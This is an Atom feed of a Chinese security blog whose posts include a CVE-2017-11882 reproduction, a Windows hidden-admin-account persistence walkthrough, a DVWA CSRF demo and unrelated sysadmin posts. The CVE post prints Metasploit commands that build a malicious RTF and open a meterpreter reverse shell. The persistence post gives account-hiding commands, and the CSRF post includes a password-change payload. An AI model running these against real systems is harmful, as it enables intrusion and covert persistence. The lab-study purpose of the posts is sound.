<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HexChristmas&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hexchristmas.github.io/"/>
  <updated>2020-12-09T08:58:17.000Z</updated>
  <id>https://hexchristmas.github.io/</id>
  
  <author>
    <name>Hex Christmas</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于go+自建gitlab因证书问题无法go mod问题</title>
    <link href="https://hexchristmas.github.io/p/b374.html"/>
    <id>https://hexchristmas.github.io/p/b374.html</id>
    <published>2020-12-09T16:42:08.000Z</published>
    <updated>2020-12-09T08:58:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于go-自建gitlab因证书问题无法go-mod问题">关于go+自建gitlab因证书问题无法go mod问题</h2><h3 id="0x00-why？">0x00 why？</h3><p>最近在写go的项目，git上有现成的轮子，拿来二次开发一下在它基础上在造就行，没想到<code>go 1.15.6</code>弃用了<code>X.509</code>证书。。。。所以导致没有办法<code>go mod</code>,官方<code>Release Notes</code>是这样写的</p><blockquote><p>CommonName 默认情况下，当不存在“使用者备用名称”时，将X.509证书上 的字段视为主机名的不推荐使用的旧行为现在被禁用。可以通过将值添加x509ignoreCN=0到GODEBUG 环境变量中来临时重新启用它。<br>请注意，如果CommonName主机名无效，则无论GODEBUG设置如何，它都将被忽略。无效名称包括那些带有字母，数字，连字符和下划线以外的任何字符的名称，以及带有空标签或结尾点的名称。</p></blockquote><h3 id="0x01-detail">0x01 detail</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x509: certificate relies on legacy Common Name field, use SANs or temporarily <span class="built_in">enable</span> Common Name matching with GODEBUG=x509ignoreCN=0</span><br></pre></td></tr></table></figure><p><img src="/p/b374/1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x509: certificate signed by unknown authority)</span><br></pre></td></tr></table></figure><p><img src="/p/b374/2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSL certificate problem: unable to get <span class="built_in">local</span> issuer certificate</span><br></pre></td></tr></table></figure><p><img src="/p/b374/3.png" alt></p><h3 id="0x02-solve">0x02 solve</h3><p>想解决这个问题，有两种方法，一种是直接把轮子嵌套进去，另一种就是解决证书问题，好在<code>gitlab</code>咱们自己可以维护，前者工作量太大了， 我们只能硬着头皮解决证书问题。</p><ul><li>安装openssl</li><li>如果你已经安装完openssl,需要拷贝openssl证书到/home下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/pki/tls/openssl.cnf /home</span><br></pre></td></tr></table></figure><ul><li>编辑<code>openssl.cnf</code>取消req_extensions = v3_req 的注释，如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####################################################################</span></span><br><span class="line">[ req ]</span><br><span class="line">default_bits            = 2048</span><br><span class="line">default_md              = sha256</span><br><span class="line">default_keyfile         = privkey.pem</span><br><span class="line">distinguished_name      = req_distinguished_name</span><br><span class="line">attributes              = req_attributes</span><br><span class="line">  <span class="comment">#x509_extensions = v3_ca # The extentions to add to the self signed cert 取消这一行的注释</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Passwords for private keys if not present they will be prompted for</span></span><br><span class="line">  <span class="comment"># input_password = secret</span></span><br><span class="line">  <span class="comment"># output_password = secret</span></span><br></pre></td></tr></table></figure><ul><li>编辑<code>[ v3_req ]</code>模块与下面相同</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ v3_req ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions to add to a certificate request</span></span><br><span class="line"></span><br><span class="line">basicConstraints = CA:FALSE</span><br><span class="line">keyUsage = nonRepudiation, digitalSignature, keyEncipherment</span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line"></span><br><span class="line">[alt_names]</span><br><span class="line">IP = xx.xx.xx.xx</span><br></pre></td></tr></table></figure><ul><li>生成<code>SANs</code>证书</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -sha256 -key server.key \</span><br><span class="line">    -subj <span class="string">"/C=CN/ST=Beijing/L=Beijing/O=xxTech/OU=xxx/CN=xx.xx.xx.xx"</span> \</span><br><span class="line">    -reqexts SAN -config openssl.cnf \</span><br><span class="line">    &lt;(<span class="built_in">printf</span> <span class="string">"[SAN]\nsubjectAltName=IP:xx.xx.xx.xx"</span>)) \</span><br><span class="line">    -out server.csr</span><br><span class="line">openssl x509 -req -days 365000 \</span><br><span class="line">    -<span class="keyword">in</span> server.csr -CA server.crt -CAkey server.key -CAcreateserial \</span><br><span class="line">    -extfile &lt;(<span class="built_in">printf</span> <span class="string">"subjectAltName=IP:xx.xx.xx.xx"</span>) \</span><br><span class="line">    -out server.crt</span><br></pre></td></tr></table></figure><p>里边的参数带<code>xx</code>的需要你改</p><ul><li>配置gitlab为ssl，编辑配置文件为如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  vim /etc/gitlab/gitlab.rb</span><br><span class="line">  ... ...</span><br><span class="line">  external_url &apos;https://xx.xx.xx.xx&apos;</span><br><span class="line"></span><br><span class="line">  nginx[&apos;redirect_http_to_https&apos;] =true</span><br><span class="line">  nginx[&apos;ssl_certificate&apos;] = &quot;/etc/gitlab/ssl/server.crt&quot;</span><br><span class="line">  nginx[&apos;ssl_certificate_key&apos;] = &quot;/etc/gitlab/ssl/server.key&quot;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><ul><li>将刚刚生成的<code>server.crt</code>和<code>server.key</code>移动到gitlab配置里</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv server.* /etc/gitlab/ssl/</span><br></pre></td></tr></table></figure><ul><li>配置生效<code>gitlab</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gitlab-ctl reconfigure</span><br><span class="line">gitlab-ctl restart</span><br></pre></td></tr></table></figure><ul><li>第一个问题就解决完了，第二个问题，将生成的证书<code>server.crt</code>安装到你自己的电脑上</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp server.crt /etc/ssl/certs</span><br><span class="line">sudo trust extract-compat</span><br></pre></td></tr></table></figure><ul><li>第三个问题，全局关闭git的ssl认证</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.sslVerify <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>此时你再去go run就不会出现错误了，可以愉快的使用<code>go+自建gitlab</code>了</p>]]></content>
    
    <summary type="html">
    
      最近在写go的项目，git上有现成的轮子，拿来二次开发一下,在它基础上在造就行，没想到go 1.15.6弃用了X.509证书。。。。
    
    </summary>
    
    
      <category term="go" scheme="https://hexchristmas.github.io/tags/go/"/>
    
      <category term="gitlab" scheme="https://hexchristmas.github.io/tags/gitlab/"/>
    
      <category term="证书" scheme="https://hexchristmas.github.io/tags/%E8%AF%81%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>权限维持-windows账户隐藏</title>
    <link href="https://hexchristmas.github.io/p/80bb.html"/>
    <id>https://hexchristmas.github.io/p/80bb.html</id>
    <published>2020-07-24T15:14:28.000Z</published>
    <updated>2020-07-24T07:15:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1>权限维持之windows账户隐藏</h1><h2 id="对注册表赋予权限">对注册表赋予权限</h2><p>默认情况下，只有system权限才可以对<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>进行修改<br>我们将<code>Administrator</code>用户完全控制以及读取勾成允许<br><img src="/p/80bb/9.png" alt><br>然后查看——&gt;刷新，<br><img src="/p/80bb/10.png" alt></p><h2 id="新建隐藏账户">新建隐藏账户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test$ test123 /add</span><br><span class="line">net localgroup administrator test$ /add</span><br></pre></td></tr></table></figure><p><img src="/p/80bb/1.png" alt><br>但此时我们在控制面板的账户管理是可以看到这个隐藏账户的<br><img src="/p/80bb/2.png" alt></p><h2 id="导出注册表">导出注册表</h2><p>找到用户名的注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br></pre></td></tr></table></figure><p>我们找到test用户的注册表将它导出为<code>aaa.reg</code><br><img src="/p/80bb/3.png" alt><br>然后我们在找到用户名为test默认类型为<code>0x3F0</code>的注册表将它导出为<code>bbb.reg</code></p><p>然后我们导出<code>Administrator</code>的注册表，默认他的默认类型是<code>0x1F4</code>,然后我们用记事本打开<code>bbb.reg</code>和<code>ccc.reg</code><br><img src="/p/80bb/4.png" alt><br>我们发现F值有所不同，那么我们其实就是这一点进行账户隐藏，我们将<code>ccc.reg</code>中的F值替换到<code>bbb.reg</code>的F值那块，</p><h2 id="删除创建的用户">删除创建的用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test$ /del</span><br></pre></td></tr></table></figure><p><img src="/p/80bb/5.png" alt></p><h2 id="导入注册表">导入注册表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit /s aaa.reg</span><br><span class="line">regedit /s bbb.reg</span><br></pre></td></tr></table></figure><p><img src="/p/80bb/6.png" alt><br>然后我们使用<code>net user</code>查看用户<br><img src="/p/80bb/7.png" alt><br>我们发现是看不见的，但是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test$</span><br></pre></td></tr></table></figure><p><img src="/p/80bb/8.png" alt><br>我们发现还是可以看到的</p>]]></content>
    
    <summary type="html">
    
      每个细节都是红队不可缺少的，虽然小但在一些时候也是一把利剑
    
    </summary>
    
    
      <category term="权限维持" scheme="https://hexchristmas.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
      <category term="windows账户隐藏" scheme="https://hexchristmas.github.io/tags/windows%E8%B4%A6%E6%88%B7%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>solaris安装记录</title>
    <link href="https://hexchristmas.github.io/p/1a31.html"/>
    <id>https://hexchristmas.github.io/p/1a31.html</id>
    <published>2020-07-16T10:54:58.000Z</published>
    <updated>2020-07-16T02:56:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Solaris10安装</h1><blockquote><p>Solaris是unix的衍生版，支持x86,amd64,sparc架构，sparc只能安装在sun服务器上</p></blockquote><h2 id="Solaris10获取">Solaris10获取</h2><p>点击下面链接，登陆自己的Orcale账号即可下载<br><a href="https://www.oracle.com/solaris/solaris10/downloads/solaris10-get-jsp-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/solaris/solaris10/downloads/solaris10-get-jsp-downloads.html</a></p><h3 id="架构怎么选择？">架构怎么选择？</h3><p>前边已经介绍了，我们选择<code>x86</code>即可<br><img src="/p/1a31/9.png" alt><br>你下载完之后就应该是这样<br><img src="/p/1a31/10.png" alt></p><h2 id="安装">安装</h2><p>我这里选用的虚拟机是<code>Mac</code>的<code>Paralles Desktop</code>,怎么选镜像啥的就不写了<br>建立完虚拟机，启动之后，选择第一个<br><img src="/p/1a31/1.png" alt><br>然后选择第一个，当然30秒自动也会选择第一个<br><img src="/p/1a31/2.png" alt><br>然后就是一系列，选键盘制式，语言什么的，都是一键化操作<br><img src="/p/1a31/3.png" alt><br><img src="/p/1a31/4.png" alt><br><img src="/p/1a31/5.png" alt><br><img src="/p/1a31/6.png" alt><br><img src="/p/1a31/7.png" alt><br>到这块，稍等1分钟左右，让他配置一下东西，配置完就进入console了<br><img src="/p/1a31/8.png" alt><br>账户是<code>root</code>，密码就是刚刚你自己设置的</p><h2 id="配置ssh">配置ssh</h2><p><code>solaris</code>服务管理命令和centos和debian是不一样的<br>编辑ssh配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure><p>重启ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svcadm restart ssh</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      由于某业务需求，最近搞起了solaris，记录一下安装过程
    
    </summary>
    
    
      <category term="solaris" scheme="https://hexchristmas.github.io/tags/solaris/"/>
    
  </entry>
  
  <entry>
    <title>减脂健身-GIF动图</title>
    <link href="https://hexchristmas.github.io/p/3767.html"/>
    <id>https://hexchristmas.github.io/p/3767.html</id>
    <published>2020-07-04T16:28:12.000Z</published>
    <updated>2020-07-04T08:29:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>看大多数运动都是1组20，3组，所以根据自己情况来，可以拉着同事一起做，hihi</p></blockquote><h3 id="基础深蹲">基础深蹲</h3><p><img src="/p/3767/1.gif" alt></p><h3 id="囚徒深蹲">囚徒深蹲</h3><p><img src="/p/3767/2.gif" alt></p><h3 id="跳跃深蹲">跳跃深蹲</h3><p><img src="/p/3767/3.gif" alt></p>]]></content>
    
    <summary type="html">
    
      咱们搞IT的大部分都是坐着，容易积累脂肪，久而久之就都变成了大猪蹄，您瞧瞧
    
    </summary>
    
    
      <category term="healthy" scheme="https://hexchristmas.github.io/tags/healthy/"/>
    
  </entry>
  
  <entry>
    <title>应急响应-关于dll劫持理解和思考</title>
    <link href="https://hexchristmas.github.io/p/1268.html"/>
    <id>https://hexchristmas.github.io/p/1268.html</id>
    <published>2020-06-29T03:16:28.000Z</published>
    <updated>2020-06-28T19:18:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1>应急响应-关于dll劫持理解和思考</h1><h2 id="什么是dll劫持">什么是dll劫持</h2><blockquote><p>觉得这块没用可以直接往下跳这看。<br>我之前觉得别人开头总是写一堆没用的，其实我只想看我想要看到的，但其实不是这样，这也许是某个大佬，凌晨静心学习分享下来的，差距就是一点一点拉开的。</p></blockquote><p>DLL(Dynamic-link library)劫持，这通常是红队权限维持的常见手段，可以理解为攻击者劫持(替换)程序目录下合法的DLL为恶意DLL。那为什么红队喜欢劫持dll来实现持久化权限维持呢，因为红队通常不会自己传个带签名的程序到机器上，大多数都会选择在目标机器上寻找带有微软签名的程序进行dll劫持，数字签名也是分三六九等的，一般微软签名的数字证书的程序会相对一般的数字证书更安全，更加不会被应急响应人发现对吧。</p><h2 id="各版本dll加载顺序">各版本dll加载顺序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* windows xp sp2 before*/</span><br><span class="line">1. 进程对应的应用程序所在目录；</span><br><span class="line">2. 当前目录（Current Directory）；</span><br><span class="line">3. 系统目录（通过 GetSystemDirectory 获取）；</span><br><span class="line">4. 16位系统目录；</span><br><span class="line">5. Windows目录（通过 GetWindowsDirectory 获取）；</span><br><span class="line">6. PATH环境变量中的各个目录；</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/* windows xp sp2 later*/</span><br><span class="line">1. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</span><br><span class="line">2. 系统目录（即%windir%system32）；</span><br><span class="line">3. 16位系统目录（即%windir%system）；</span><br><span class="line">4. Windows目录（即%windir%）；</span><br><span class="line">5. 当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</span><br><span class="line">5. PATH环境变量中的各个目录；</span><br><span class="line">```</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## 常见的dll劫持手法</span><br><span class="line">### DLL劫持技术与白利用结合</span><br><span class="line"></span><br><span class="line">## 排查过程</span><br></pre></td></tr></table></figure><p>可疑进程</p><p>网络流量</p><p>启动项</p><p>文件比对</p><pre><code></code></pre>]]></content>
    
    <summary type="html">
    
      最近攻防演练总是遇到，还有之前应急时候也总是遇到，总是没有办法很好处理，逼迫自己提升哈，所以还是总结学习分析一波
    
    </summary>
    
    
      <category term="incident response" scheme="https://hexchristmas.github.io/tags/incident-response/"/>
    
      <category term="dll劫持" scheme="https://hexchristmas.github.io/tags/dll%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882远程代码执行分析复现</title>
    <link href="https://hexchristmas.github.io/p/d60b.html"/>
    <id>https://hexchristmas.github.io/p/d60b.html</id>
    <published>2020-06-29T03:01:26.000Z</published>
    <updated>2020-06-29T12:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2017-11882远程代码执行分析复现</h1><h2 id="概述">概述</h2><p>2017年11月14日，微软发布了安全漏洞更新<strong>CVE-2017-11882 | Microsoft Office内存损坏漏洞</strong>，根据趋势科技的博文，漏洞潜伏17年之久。</p><blockquote><p>趋势科技发现利用CVE-2017-11882分发了间谍软件Loki（TSPY_LOKI），发现了一个恶意的RTF格式文件。有效载荷通过调用PowerShell的HTML应用程序（HTA）删除，然后该PowerShell检索信息窃取程序。</p></blockquote><h2 id="受影响版本">受影响版本</h2><ul><li>Microsoft Office 2016 (64-bit edition) 0</li><li>Microsoft Office 2016 (32-bit edition) 0</li><li>Microsoft Office 2013 Service Pack 1 (64-bit editions)</li><li>Microsoft Office 2013 Service Pack 1 (32-bit editions)</li><li>Microsoft Office 2010 (64-bit edition) SP2</li><li>Microsoft Office 2010 (32-bit edition) SP2</li><li>Microsoft Office 2007 SP3</li></ul><h2 id="分析环境">分析环境</h2><ul><li>Microsoft Windows 10 专业工作站版</li><li>Windbg</li></ul><h2 id="漏洞分析">漏洞分析</h2><h2 id="漏洞复现">漏洞复现</h2><p>metasploit生成恶意文档样本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use windows/fileformat/office_ms17_11882</span><br><span class="line">msf5 exploit(windows/fileformat/office_ms17_11882) &gt;  <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/fileformat/office_ms17_11882) &gt; <span class="built_in">set</span> URIPATH eee</span><br><span class="line">URIPATH =&gt; eee</span><br><span class="line">msf5 exploit(windows/fileformat/office_ms17_11882) &gt; <span class="built_in">set</span> LHOST 192.168.1.104</span><br><span class="line">LHOST =&gt; 192.168.1.104</span><br><span class="line">msf5 exploit(windows/fileformat/office_ms17_11882) &gt; <span class="built_in">set</span> LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf5 exploit(windows/fileformat/office_ms17_11882) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/eee</span><br><span class="line">[*] Local IP: http://192.168.1.104:8080/eee</span><br><span class="line">[*] Server started.</span><br><span class="line">[+] msf.rtf stored at /Users/hacker/.msf4/<span class="built_in">local</span>/msf.rtf</span><br><span class="line">[*] Handling request <span class="keyword">for</span> .sct from 192.168.1.104</span><br><span class="line">[*] Delivering payload to 192.168.1.104...</span><br><span class="line">[*] Handling request <span class="keyword">for</span> .sct from 192.168.1.104</span><br><span class="line">[*] Delivering payload to 192.168.1.104...</span><br></pre></td></tr></table></figure><p>起shell监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.104</span><br><span class="line">lhost =&gt; 192.168.1.104</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.104:2333</span><br><span class="line">[*] Sending stage (176195 bytes) to 192.168.1.104</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.104:2333 -&gt; 192.168.1.104:50141) at 2020-06-29 02:21:44 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : HEXCHRISTMA7F81</span><br><span class="line">OS              : Windows 10 (10.0 Build 18362).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="/p/d60b/1.png" alt></p><h2 id="修复方案">修复方案</h2><ol><li>微软已经对此漏洞做出了修复。</li></ol><ul><li>下载<br><code>https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882</code>更新补丁进行修补</li><li>开启Windows Update功能，定期对系统进行自动更新</li></ul><ol start="2"><li>由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</li></ol><ul><li>按下Win R组合键，打开cmd.exe</li><li>输入以下两条命令：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add “HKLM\SOFTWARE\Microsoft\Office\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125; ” /v “Compatibility Flags” /t REG_DWORD /d 0x400</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      虽然很多人都已经复现了，帖子也很多，还是准备把每个漏洞都分析，复现一遍
    
    </summary>
    
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>关于web安全...</title>
    <link href="https://hexchristmas.github.io/p/224c.html"/>
    <id>https://hexchristmas.github.io/p/224c.html</id>
    <published>2020-06-28T18:40:37.000Z</published>
    <updated>2020-06-28T19:05:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1>关于web安全…</h1><h2 id="关于跨站">关于跨站</h2><h3 id="xss，csrf，xsrf">xss，csrf，xsrf</h3><blockquote><p>常听到的就是xss，csrf，但是xsrf也是必须要知道的</p></blockquote><h4 id="xss">xss</h4><h4 id="csrf">csrf</h4><h5 id="一些概念性的话">一些概念性的话</h5><p>csrf即跨站请求伪造，就是攻击者盗用了你的身份，以你名义执行恶意请求</p><blockquote><p>具体？<br>你(a)登录了一个受信任的b(网站)，当你登陆成功时候，为了你下次访问接口的时候可以得到身份验证，在返回的<strong>reponse</strong>设置<strong>setCookies</strong>,当你此时没有退出登陆的情况下，恰好访问了由攻击者©构造的(d),攻击者©通过你访问的恶意网站(d)，那么攻击者©就会得到已认证过身份的会话，就相当于攻击者©间接性登陆了你(a)的账号</p></blockquote><p>以上情况前提是浏览器没有同源策略</p><h6 id="什么是同源策略？">什么是同源策略？</h6><p>不通源的客户端在没有授权的情况下，是不能读写对方资源的，如果两个页面的协议，端口和域名相同，则可认为是同源。</p><h5 id="如何利用">如何利用</h5><p>我们以dvwa中csrf作为演示,我们更改完密码在请求中发现，以明文形式暴露了我们修改的密码<br><img src="/p/224c/1.png" alt><br>我们构造一个简单html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line">&lt;img</span><br><span class="line">src="http://10.211.55.11/vulnerabilities/csrf/?password_new=aaa&amp;password_conf=aaa&amp;Change=Change#"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们模拟受害者点击恶意链接<br><img src="/p/224c/2.png" alt><br>那么，此时受害者在尝试eee去登陆，就会发现登陆不上了<br><img src="/p/224c/3.png" alt></p><h5 id="如何修复">如何修复</h5><ol><li>通过token或者session来判断当前用户身份</li><li>敏感操作需要验证码，更改密码需要验证原密码</li></ol><h4 id="xsrf">xsrf</h4><h5 id="一些概念性的话-2">一些概念性的话</h5>]]></content>
    
    <summary type="html">
    
      记录学习web安全各种漏洞的原理，利用，危害，修复方式，本来想单个帖子写的，想了想还是放到一起吧
    
    </summary>
    
    
      <category term="web" scheme="https://hexchristmas.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>某国企勒索病毒应急响应</title>
    <link href="https://hexchristmas.github.io/p/6b6e.html"/>
    <id>https://hexchristmas.github.io/p/6b6e.html</id>
    <published>2020-06-15T19:42:57.000Z</published>
    <updated>2020-06-15T11:48:23.000Z</updated>
    
